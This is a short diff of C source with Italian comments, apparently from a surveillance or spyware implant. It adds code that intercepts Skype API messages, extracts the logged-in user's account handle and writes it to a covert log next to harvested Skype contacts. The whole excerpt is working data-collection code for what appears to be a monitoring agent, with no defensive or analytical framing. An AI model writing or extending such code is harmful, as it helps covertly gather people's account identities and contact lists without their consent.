@@ -126,6 +126,17 @@ DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILET
 	// Parsa il messaggio di skype con tutti i contatti
 	if (dwFlags & FLAGS_SKAPI_MSG) {
 		NullTerminatePacket(dwLen, msg);
+
+		// Parsa il messaggio con il nome del proprio account
+		if (!strncmp((char *)msg, "CURRENTUSERHANDLE ", strlen("CURRENTUSERHANDLE "))) {
+			msg += strlen("CURRENTUSERHANDLE ");
+			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+			_snwprintf_s(user_handle, sizeof(user_handle)/sizeof(WCHAR), _TRUNCATE, L"%S", msg);		
+			DumpContact(hfile, CONTACT_SRC_SKYPE, user_handle, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
+			Log_CloseFile(hfile);
+			return 1;
+		}
+
 		if (strncmp((char *)msg, "AUTH_CONTACTS_PROFILES ", strlen("AUTH_CONTACTS_PROFILES ")))
 			return 1;
 		msg += strlen("AUTH_CONTACTS_PROFILES");
